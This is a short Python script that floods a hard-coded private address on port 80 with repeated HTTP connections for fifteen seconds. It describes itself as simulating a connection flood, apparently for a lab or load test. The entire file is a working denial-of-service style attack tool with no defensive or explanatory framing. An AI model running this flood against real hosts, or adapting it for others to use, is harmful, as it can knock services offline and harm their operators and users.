#!/usr/bin/env python3
import socket
import time

TARGET = "10.0.1.2"
DURATION = 15

def main():
    print(f"[+] Simulating connection flood against {TARGET}")
    end = time.time() + DURATION

    while time.time() < end:
        try:
            s = socket.socket()
            s.connect((TARGET, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            s.recv(1024)
            s.close()
        except:
            pass

    print("[+] Flood complete.")

if __name__ == "__main__":
    main()